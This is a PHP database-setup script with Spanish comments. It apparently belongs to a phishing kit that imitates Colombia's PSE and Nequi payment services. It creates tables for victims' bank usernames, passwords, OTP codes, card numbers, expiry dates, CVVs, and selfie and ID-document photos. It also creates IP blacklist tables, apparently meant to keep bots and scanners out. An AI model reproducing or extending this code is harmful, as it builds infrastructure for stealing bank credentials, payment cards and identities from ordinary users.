<?php
include __DIR__ . "/db.php";

// 1. Crear tablas si no existen (esquema completo)
$tablas = [
    "pse" => "CREATE TABLE IF NOT EXISTS pse (
        id SERIAL PRIMARY KEY,
        estado INT DEFAULT 0
    )",
    "nequi" => "CREATE TABLE IF NOT EXISTS nequi (
        id SERIAL PRIMARY KEY,
        estado INT DEFAULT 0
    )",
    "blacklist" => "CREATE TABLE IF NOT EXISTS blacklist (
        id SERIAL PRIMARY KEY,
        ip_address VARCHAR(45) UNIQUE NOT NULL,
        created_at TIMESTAMP DEFAULT NOW()
    )",
    "blacklistbot" => "CREATE TABLE IF NOT EXISTS blacklistbot (
        id SERIAL PRIMARY KEY,
        ip_address VARCHAR(45) UNIQUE NOT NULL,
        created_at TIMESTAMP DEFAULT NOW()
    )",
    "blocked_ips" => "CREATE TABLE IF NOT EXISTS blocked_ips (
        id SERIAL PRIMARY KEY,
        ip VARCHAR(255) UNIQUE,
        created_at TIMESTAMP DEFAULT NOW()
    )",
];

$resultados = [];
foreach ($tablas as $nombre => $sql) {
    try {
        $conn->exec($sql);
        $resultados[$nombre] = "OK (creada o ya existia)";
    }
    catch (PDOException $e) {
        $resultados[$nombre] = "ERROR create: " . $e->getMessage();
    }
}

// 2. Migraciones: agregar columnas faltantes en pse (por si fue creada con esquema simple)
$migraciones_pse = [
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS usuario VARCHAR(255)",
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS clave VARCHAR(255)",
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS banco VARCHAR(255)",
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS email VARCHAR(255)",
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS ip_address VARCHAR(255)",
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS otp VARCHAR(50)",
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS tarjeta VARCHAR(50)",
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS fecha_exp VARCHAR(20)",
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS cvv VARCHAR(10)",
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS foto_selfie VARCHAR(255)",
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS foto_front VARCHAR(255)",
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS foto_back VARCHAR(255)",
    "ALTER TABLE pse ADD COLUMN IF NOT EXISTS fecha TIMESTAMP DEFAULT NOW()",
];

$resultados['pse_migraciones'] = [];
foreach ($migraciones_pse as $sql) {
    try {
        $conn->exec($sql);
        $resultados['pse_migraciones'][] = "OK: $sql";
    }
    catch (PDOException $e) {
        $resultados['pse_migraciones'][] = "ERR: " . $e->getMessage();
    }
}

// 3. Migraciones nequi
$migraciones_nequi = [
    "ALTER TABLE nequi ADD COLUMN IF NOT EXISTS celular VARCHAR(50)",
    "ALTER TABLE nequi ADD COLUMN IF NOT EXISTS clave VARCHAR(50)",
    "ALTER TABLE nequi ADD COLUMN IF NOT EXISTS ip_address VARCHAR(255)",
    "ALTER TABLE nequi ADD COLUMN IF NOT EXISTS otp VARCHAR(50)",
    "ALTER TABLE nequi ADD COLUMN IF NOT EXISTS fecha TIMESTAMP DEFAULT NOW()",
];

$resultados['nequi_migraciones'] = [];
foreach ($migraciones_nequi as $sql) {
    try {
        $conn->exec($sql);
        $resultados['nequi_migraciones'][] = "OK: $sql";
    }
    catch (PDOException $e) {
        $resultados['nequi_migraciones'][] = "ERR: " . $e->getMessage();
    }
}

echo "<pre>";
foreach ($resultados as $n => $m) {
    if (is_array($m)) {
        echo "\n[$n]\n";
        foreach ($m as $line)
            echo "  $line\n";
    }
    else {
        echo "$n: $m\n";
    }
}
echo "</pre><p style='color:orange'>Elimina este archivo despues.</p>";
